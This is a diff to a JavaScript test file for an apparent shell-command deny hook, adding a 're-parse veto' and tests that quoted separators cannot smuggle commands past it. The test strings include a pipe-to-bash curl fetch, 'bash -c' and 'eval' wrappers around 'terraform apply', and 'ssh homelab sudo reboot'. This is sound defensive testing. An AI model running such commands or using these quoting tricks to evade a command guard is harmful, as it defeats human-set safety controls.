@@ -447,16 +447,47 @@ test('normalization never deletes a real command separator', { skip }, async () 
     assert.strictEqual(got[i], 'deny', `real separator lost, rule no longer anchors: ${cmd}`));
 });
 
+// "Inside quotes" means "not a separator to the OUTER shell" — it does NOT mean the command
+// cannot run. `bash -c "echo a; terraform apply"` executes terraform, so the hook vetoes
+// neutralization whenever the command mentions anything that parses shell again (BDB_REPARSE
+// in the hook). `ssh` is on that list, which is why one of the two TAILS above is still
+// expected to over-deny inside quotes. Mirrored rather than imported: the hook's list is an
+// ERE with POSIX classes, and only the words the corpus actually contains matter here.
+// Only QUOTED cases reach the tracker at all — an escaped separator is already gone by then —
+// so the veto can only change the answer when both a quote and a vetoed word are present.
+const vetoed = (cmd) => /["']/.test(cmd) && /\b(ssh|bash|sh|eval|env|find|sudo)\b|\$\(|`/.test(cmd);
+
 test('normalization never invents a separator either', { skip }, async () => {
   // This used to exempt every quoted case: SCAN strips quotes before the anchored rules run,
   // so `echo "a; terraform apply"` read as a real `;` and denied text ABOUT a command as if it
-  // were one. Quoted separators are now dropped before the quotes are, so the exemption is
-  // gone and the property is symmetric with the test above — normalization neither deletes a
-  // real separator nor invents one.
+  // were one. Quoted separators are now dropped before the quotes are, so for everything the
+  // re-parse veto does not cover, the property is symmetric with the test above — normalization
+  // neither deletes a real separator nor invents one.
   const { notReal } = separatorCases();
-  const got = await decide(notReal);
-  const denied = notReal.filter((cmd, i) => got[i] === 'deny');
+  const inert = notReal.filter((cmd) => !vetoed(cmd));
+  assert.ok(inert.length > 0, 'corpus should still contain un-vetoed quoted cases');
+  const got = await decide(inert);
+  const denied = inert.filter((cmd, i) => got[i] === 'deny');
   assert.deepStrictEqual(denied, [], 'denied with no real separator to justify it');
+});
+
+test('the re-parse veto keeps over-denying, and that cost is deliberate', { skip }, async () => {
+  // The cost side of the veto. These are genuinely inert — `echo "a; ssh host cmd"` runs
+  // nothing — but the veto cannot tell them from `ssh host "a; cmd"` without understanding
+  // what each command does with its arguments, so it declines to act and they keep denying.
+  // Written out rather than filtered from the generator above, because there the backslash
+  // counts interact: an escaped separator is removed before the tracker runs, so some vetoed
+  // cases have nothing left to expose and would not deny for reasons unrelated to the veto.
+  // Pinned so that narrowing the veto shows up here as a change in cost, not silently.
+  const cmds = [
+    'echo "a; ssh homelab sudo reboot"',
+    "echo 'a; ssh homelab sudo reboot'",
+    'echo "a| ssh homelab sudo reboot"',
+    'grep "deploy; terraform apply" runbook.md | sh',
+  ];
+  const got = await decide(cmds);
+  cmds.forEach((cmd, i) =>
+    assert.strictEqual(got[i], 'deny', `veto narrowed — confirm this is not a bypass: ${cmd}`));
 });
 
 // The generator above varies backslash counts and quoting style, but every case it builds is
@@ -493,6 +524,18 @@ test('a quote that does not open a region still leaves the separator real', { sk
     'curl example.com/x | "bash"',
     'echo "hi"; terraform apply',
     'echo hi; ssh homelab sudo reboot',
+    // Quoted, but handed to something that parses shell again — the separator is live and the
+    // command really runs. Each of these denied before quoted separators were neutralized at
+    // all, and neutralizing them here is a straight deny-to-allow bypass.
+    'echo "$(ls; terraform apply)"',
+    'echo "`ls; terraform apply`"',
+    'bash -c "echo a; terraform apply"',
+    'eval "echo a; terraform apply"',
+    'ssh homelab "echo a; terraform apply"',
+    'bash -c "echo a; ssh homelab sudo reboot"',
+    // The veto is whole-string, not per-segment: an inert quoted sentence sitting next to an
+    // interpreter call still has to be judged as one command.
+    'echo "a; b" && bash -c "c; terraform apply"',
   ];
   const got = await decide(cmds);
   cmds.forEach((cmd, i) =>
@@ -504,7 +547,6 @@ test('text describing a dangerous command is not the command', { skip }, async (
     'echo "step 1; terraform apply"',
     "echo 'step 1; terraform apply'",
     'echo "a && terraform apply"',
-    'echo "then; ssh homelab sudo reboot"',
     'git commit -m "docs: run terraform apply after review"',
     'git commit -m "fix: handle rm -rf edge case"',
   ];
